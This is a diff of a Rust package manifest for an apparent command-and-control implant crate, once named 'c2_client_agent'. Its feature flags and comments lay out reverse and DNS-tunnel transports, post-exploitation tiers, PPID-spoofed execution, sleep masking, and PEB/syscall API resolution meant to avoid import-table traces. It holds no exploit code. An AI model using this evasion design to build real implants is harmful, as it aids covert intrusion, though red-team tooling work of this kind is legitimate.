@@ -6,49 +6,91 @@ edition = "2021"
 [lib]
 name = "cupcake_core"
 crate-type = ["cdylib", "rlib"]
+# Doc-tests still reference the old crate name `c2_client_agent`; unit tests cover shipped paths.
+doctest = false
 
 [features]
-default = ["ws"]  # Default to WebSocket if not specified
+# Default product build: WebSocket + standard post-ex (NO stealth-adv / sleep-mask).
+default = ["ws", "standard"]
+
+# --- Transports (Builder picks one) ---
 ws = ["dep:tokio-tungstenite", "dep:url"]
-ws-tls = ["ws", "tokio-tungstenite/rustls-tls-native-roots"]  # wss:// TLS support via rustls
-tcp = []  # TCP protocol (uses tokio's built-in TcpStream)
-tcp_bind = [] # TCP Bind protocol (Agent listens for connection)
-dns = ["dep:trust-dns-resolver"]  # DNS 隧道协议实现
+ws-tls = ["ws", "tokio-tungstenite/rustls-tls-native-roots"]
+tcp = []
+tcp_bind = []
+dns = ["dep:trust-dns-resolver"]
+
+# --- Capability tiers ---
+# beacon: ultra-thin Stage0 (transport + module_loader only) — optional / non-product
+beacon = ["module-loader"]
+# minimal: REVERSE product default — daily ops built-in + loader for heavy L2
+#   built-in: hybrid shell / PTY / fs / process
+#   NOT built-in: socks / plugin / bof / dotnet (module or forward/standard)
+# Web UI PTY uses Yamux stream 0x01 → requires `pty`.
+minimal = ["post-ex", "pty", "encoding-support", "module-loader", "isolated-exec"]
+# standard: FORWARD / full post-ex monolith — process injection permanently removed
+standard = ["post-ex", "pty", "socks", "plugin", "bof", "dotnet", "encoding-support", "logging", "rt-multi", "module-loader", "isolated-exec"]
+# full: standard + high-signature stealth patches
+full = ["standard", "stealth-adv"]
+
+# post-ex: fs / process / executor / hybrid shell (daily ops)
+post-ex = []
+module-loader = []
+# PPID-spoofed sacrificial host for BOF/.NET (not same-process module)
+isolated-exec = []
+
+# Individual capability gates (true compile-time exclusion)
+pty = []
+socks = []
+plugin = ["dep:lazy_static"]
+# inject feature deleted — no process injection builds
+bof = ["dep:lazy_static"]
+dotnet = []
+encoding-support = ["dep:encoding_rs"]
+logging = ["dep:env_logger"]
+rt-multi = ["tokio/rt-multi-thread"]
+
+# Stealth options — OFF by default
+stealth-adv = ["dep:lazy_static"]
+sleep-mask = []
 
 [dependencies]
-tokio = { version = "1.35", features = ["rt", "rt-multi-thread", "macros", "io-util", "net", "time", "sync", "process"] }
-tokio-tungstenite = { version = "0.21", features = ["rustls-tls-native-roots"], optional = true }
-tokio-util = { version = "0.7", features = ["codec", "compat"] }
+# Single-thread runtime by default (smaller); standard enables rt-multi-thread
+tokio = { version = "1.35", default-features = false, features = ["rt", "macros", "io-util", "net", "time", "sync", "process"] }
+tokio-tungstenite = { version = "0.21", default-features = false, features = ["connect"], optional = true }
+tokio-util = { version = "0.7", default-features = false, features = ["codec", "compat"] }
 yamux = "0.10"
 url = { version = "2.5", optional = true }
 trust-dns-resolver = { version = "0.23", optional = true }
-serde = { version = "1.0", features = ["derive"] }
-serde_json = "1.0"
+serde = { version = "1.0", default-features = false, features = ["derive", "std"] }
+serde_json = { version = "1.0", default-features = false, features = ["std"] }
 uuid = { version = "1.6", default-features = false }
-sha2 = "0.10"
+sha2 = { version = "0.10", default-features = false }
 thiserror = "1.0"
-log = { version = "0.4" }
-env_logger = "0.11"
-futures-util = "0.3"
-encoding_rs = "0.8"
-base64 = "0.21"
+log = { version = "0.4", default-features = false }
+env_logger = { version = "0.11", optional = true }
+futures-util = { version = "0.3", default-features = false, features = ["std", "async-await", "sink"] }
+encoding_rs = { version = "0.8", optional = true }
+base64 = { version = "0.21", default-features = false, features = ["std"] }
 async-trait = "0.1"
 aes-gcm = { version = "0.10", default-features = false, features = ["aes", "alloc"] }
-socket2 = { version = "0.6", features = ["all"] }
-
-portable-pty = "0.8"
-hex = "0.4"
-lazy_static = "1.4"
+socket2 = { version = "0.6", default-features = false }
+hex = { version = "0.4", default-features = false, features = ["std"] }
+lazy_static = { version = "1.4", optional = true }
 
 [target.'cfg(windows)'.dependencies]
+# Prefer types/constants; sensitive APIs go through PEB/syscall paths.
+# CreateProcess/attributes are PEB-resolved in native/spawn (no hard IAT from this crate).
+# heapapi retained for optional sleep-mask HeapWalk types only.
 winapi = { version = "0.3", features = [
-    "winnt", "processthreadsapi", "memoryapi", "handleapi", 
-    "errhandlingapi", "winbase", "tlhelp32", "winuser",
-    "oleauto", "combaseapi", "objbase", "unknwnbase",
+    "winnt", "memoryapi", "handleapi",
+    "errhandlingapi", "winbase", "winuser",
+    "oleauto", "unknwnbase",
     "debugapi", "sysinfoapi", "lmjoin", "lmcons", "lmapibuf",
     "namedpipeapi", "ioapiset", "synchapi", "fileapi",
     "threadpoollegacyapiset", "psapi", "securitybaseapi",
-    "wtypes", "winerror", "guiddef", "minwinbase", "heapapi"
+    "wtypes", "winerror", "guiddef", "minwinbase", "heapapi",
+    "processenv", "ntdef"
 ] }
 widestring = "1.0"
 
@@ -60,16 +102,3 @@ nix = { version = "0.27", features = ["process", "fs", "user"] }
 proptest = "1.4"
 mockall = "0.12"
 tempfile = "3.8"
-
-# 🛡️ Phase 3: Release profile optimized for UPX + minimum binary size
-[profile.release]
-opt-level = "z"         # Optimize for size (best UPX ratio)
-lto = "fat"             # Full link-time optimization
-codegen-units = 1       # Single codegen unit for max optimization
-panic = "abort"         # Remove panic unwind tables
-strip = "symbols"       # Strip debug symbols (saves ~60%)
-
-# 🛡️ Phase 3: Debug build for testing
-[profile.dev]
-opt-level = 0
-debug = true
